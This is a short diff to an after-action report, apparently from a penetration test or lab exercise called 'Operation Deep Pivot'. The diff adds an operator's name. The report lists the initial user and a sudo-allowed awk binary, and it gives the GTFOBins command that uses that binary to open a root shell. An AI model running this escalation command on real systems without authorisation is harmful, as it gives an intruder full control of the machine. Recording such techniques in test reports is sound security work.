@@ -1,5 +1,7 @@
 # OPERATION DEEP PIVOT: AFTER ACTION REPORT
-**Operator:** ## PHASE 1: PRIVILEGE ESCALATION
+* **Operator:** Kenneth Cardona
+
+ ## PHASE 1: PRIVILEGE ESCALATION
 * **Initial Access User:** mercenary
 * **Vulnerable Sudo Binary:** /usr/bin/awk
 * **GTFOBins Exploit Command Used:** sudo awk 'BEGIN {system("/bin/sh")}'
